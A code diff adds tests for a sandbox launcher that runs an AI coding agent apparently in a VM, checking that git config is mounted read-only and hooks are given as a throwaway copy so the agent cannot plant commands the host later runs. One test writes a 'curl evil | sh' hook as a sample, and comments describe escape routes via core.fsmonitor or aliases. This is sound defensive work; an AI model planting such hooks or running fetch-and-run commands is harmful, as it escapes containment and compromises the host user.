@@ -3682,9 +3682,12 @@ def test_argv_includes_sandbox_briefing(
     assert "--append-system-prompt" in argv
     briefing = argv[argv.index("--append-system-prompt") + 1]
     assert "sandbox" in briefing.lower()
-    # The mounts are read-write: the agent must know its changes outlive the VM.
+    # The mounts are read-write: the agent must know its changes outlive the VM...
     assert "persists on the host" in briefing
-    assert "git hooks" in briefing
+    # ...except the files the host runs, and why `git push -u` cannot save upstream.
+    assert ".git/config is read-only" in briefing
+    assert "git push origin HEAD" in briefing
+    assert ".git/hooks" in briefing
     # Rootful nested containers leave subuid-owned files the host user can't delete.
     assert '--user "$(id -u):$(id -g)"' in briefing
 
@@ -4165,3 +4168,153 @@ def test_sandbox_launch_with_loopback_hooks_maps_host_loopback(
     assert any(arg.startswith("--network=pasta:--map-host-loopback") for arg in argv)
     url = _settings_arg(argv)["hooks"]["Stop"][0]["hooks"][0]["url"]
     assert url.startswith(f"http://{claude_profile.SANDBOX_HOST_LOOPBACK}:8080/")
+
+
+# ---------------------------------------------------------------------------
+# host-trusted state: files the VM can reach that the host later runs
+# ---------------------------------------------------------------------------
+
+
+def _repo(tmp_path: Path) -> Path:
+    repo = tmp_path / "repo"
+    _git("init", "-q", str(repo))
+    return repo
+
+
+def _mount_source(mounts: list[str], target: Path) -> Path:
+    """The host path a read-write mount puts at target."""
+    [source] = [spec.split(":")[0] for spec in mounts if spec.endswith(f":{target}:z")]
+    return Path(source)
+
+
+def test_sandbox_mounts_pin_the_repo_git_config_read_only(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    # core.fsmonitor, core.sshCommand or an alias set from the VM would run on the host's
+    # next git command in the repo, a shell prompt's `git status` included.
+    repo = _repo(tmp_path)
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    config = repo / ".git" / "config"
+    assert f"{config}:{config}:ro,z" in _sandbox_mounts(profile, repo)
+
+
+def test_sandbox_mounts_give_the_vm_a_throwaway_copy_of_the_hooks(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    repo = _repo(tmp_path)
+    hooks = repo / ".git" / "hooks"
+    (hooks / "pre-commit").write_text("#!/bin/sh\nexit 0\n")
+    (hooks / "pre-commit").chmod(0o755)
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    copy = _mount_source(_sandbox_mounts(profile, repo), hooks)
+    # The host's hooks run in the VM too, and what the VM writes lands in the copy.
+    assert (copy / "pre-commit").read_text() == "#!/bin/sh\nexit 0\n"
+    assert os.access(copy / "pre-commit", os.X_OK)
+    (copy / "post-checkout").write_text("#!/bin/sh\ncurl evil | sh\n")
+    assert not (hooks / "post-checkout").exists()
+    # Each launch starts again from the host's hooks.
+    copy = _mount_source(_sandbox_mounts(profile, repo), hooks)
+    assert (copy / "pre-commit").exists()
+    assert not (copy / "post-checkout").exists()
+
+
+def test_hooks_copy_keeps_links_as_links(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    # Following a link would copy whatever it points at into the VM.
+    repo = _repo(tmp_path)
+    secret = tmp_path / "id_ed25519"
+    secret.write_text("PRIVATE KEY")
+    (repo / ".git" / "hooks" / "pre-push").symlink_to(secret)
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    copy = _mount_source(_sandbox_mounts(profile, repo), repo / ".git" / "hooks")
+    assert os.readlink(copy / "pre-push") == str(secret)
+
+
+def test_hooks_copy_skips_a_linked_hooks_dir(
+    real_git_toplevel: None, tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    repo = _repo(tmp_path)
+    hooks = repo / ".git" / "hooks"
+    for sample in hooks.iterdir():
+        sample.unlink()
+    hooks.rmdir()
+    elsewhere = tmp_path / "ssh"
+    elsewhere.mkdir()
+    (elsewhere / "id_ed25519").write_text("PRIVATE KEY")
+    hooks.symlink_to(elsewhere)
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    mounts = _sandbox_mounts(profile, repo)
+    assert not any(spec.endswith(f":{hooks}:z") for spec in mounts)
+    assert "hooks" in capsys.readouterr().err
+
+
+def test_sandbox_mounts_protect_a_worktrees_common_git_state(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    repo = _repo(tmp_path)
+    _git("-C", str(repo), "commit", "-q", "--allow-empty", "-m", "init")
+    worktree = tmp_path / "feature"
+    _git("-C", str(repo), "worktree", "add", "-q", str(worktree))
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    mounts = _sandbox_mounts(profile, worktree)
+    config = repo / ".git" / "config"
+    assert f"{config}:{config}:ro,z" in mounts
+    assert _mount_source(mounts, repo / ".git" / "hooks").is_dir()
+
+
+def test_sandbox_mounts_protect_submodule_git_state(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    # `git status` in the superproject runs git in each submodule, which reads the
+    # submodule's own config.
+    lib = tmp_path / "lib"
+    _git("init", "-q", str(lib))
+    _git("-C", str(lib), "commit", "-q", "--allow-empty", "-m", "init")
+    repo = _repo(tmp_path)
+    _git(
+        "-C",
+        str(repo),
+        "-c",
+        "protocol.file.allow=always",
+        "submodule",
+        "add",
+        "-q",
+        str(lib),
+        "vendor/lib",
+    )
+    git_dir = repo / ".git" / "modules" / "vendor" / "lib"
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    mounts = _sandbox_mounts(profile, repo)
+    config = git_dir / "config"
+    assert f"{config}:{config}:ro,z" in mounts
+    assert _mount_source(mounts, git_dir / "hooks").is_dir()
+
+
+def test_sandbox_mounts_ignore_a_linked_submodule_git_dir(
+    real_git_toplevel: None, tmp_path: Path
+) -> None:
+    # A link under modules/ could pass off another repo's git dir as a submodule's,
+    # getting that repo's config (remote URLs, maybe credentials) mounted into the VM.
+    other = tmp_path / "other"
+    _git("init", "-q", str(other))
+    repo = _repo(tmp_path)
+    (repo / ".git" / "modules").mkdir()
+    (repo / ".git" / "modules" / "planted").symlink_to(other / ".git")
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    assert not any("planted" in spec for spec in _sandbox_mounts(profile, repo))
+
+
+def test_sandbox_mounts_no_git_state_outside_a_repo(tmp_path: Path) -> None:
+    profile = tmp_path / "prof"
+    profile.mkdir()
+    cwd = tmp_path / "work"
+    cwd.mkdir()
+    assert not any("/.git/" in spec for spec in _sandbox_mounts(profile, cwd))
